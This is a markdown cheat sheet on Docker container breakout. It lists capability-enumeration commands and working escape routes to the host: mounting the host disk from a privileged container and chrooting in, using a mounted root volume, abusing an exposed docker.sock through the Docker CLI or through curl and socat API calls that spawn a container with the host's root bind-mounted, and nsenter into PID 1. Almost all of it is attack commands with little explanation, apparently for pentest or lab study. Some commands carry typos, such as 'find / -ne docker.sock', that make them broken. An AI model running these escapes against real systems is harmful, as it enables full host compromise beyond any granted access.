#### Basic Capability Enumeration
```bash
find / -ne docker.sock
cat /proc/self/cgroup
ps uxxa
mount
capsh --print
```

- **Alternative - if capsh is not installed**
```bash
grep Cap /proc/self/status
capsh --decode=<id>
```

#### Capability Sets Explanation
- **CapEff**: Effective capabilities currently being used.
- **CapPrm**: Permitted capabilities that a process may use.
- **CapInh**: Inherited capabilities from parent processes.
- **CapBnd**: Bounding set restricting future capabilities.
- **CapAmb**: Ambient capabilities for non-SUID binaries.

#### Notable Capabilities
- **CAP_CHOWN**: Change file UIDs and GIDs.
- **CAP_DAC_OVERRIDE**: Bypass file read/write/execute permissions.
- **CAP_SYS_ADMIN**: Manage system resources (most powerful).
- **CAP_SYS_CHROOT**: Use chroot, change mount nespaces.

### Example 1: Privileged Container
```bash
docker run -it --privileged ubuntu /bin/bash
```

**Route 1: Chroot to Host**
```bash
fdisk -l
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host/
```

**Route 2: List Processes and Inspect Host**
```bash
#list processes, go to host process
ps uxxa

# get who is running pid
cat /proc/{pid}/cgroup
```

### Example 2: Docker with Root or /etc Mounted as Volume
```bash
docker run -it -v /:/host alpine /bin/ash
mount
chroot /host
```

### Example 3: Docker Socket
```bash
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
```

#### Route 1: Docker CLI
```bash
apt update -y && apt install -y wget

wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz
tar xvf docker-17.03.0-ce.tgz
cd docker

find / -ne docker.sock
./docker -H unix:///run/docker.sock images
./docker -H unix:///run/docker.sock run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```

#### Route 2: Socat
```bash
apt update -y && apt install -y curl socat

echo '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}' > container.json

curl -XPOST -H "Content-Type: application/json" --unix-socket /run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
curl -XPOST --unix-socket /run/docker.sock http://localhost/containers/<id-first-5-chars>/start

socat - UNIX-CONNECT:/run/docker.sock

POST /containers/<id-first-5-chars>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

### Using nsenter for nespace Manipulation
```bash
nsenter -t 1 -m -u -i -n -p
```

### Various Resources
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Malicious Containers Workshop](https://github.com/lockfale/Malicious_Containers_Workshop/blob/main/DC31/labs_walk_thru.md)
- [Docker Breakout](https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/docker-breakout.md)
- [Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)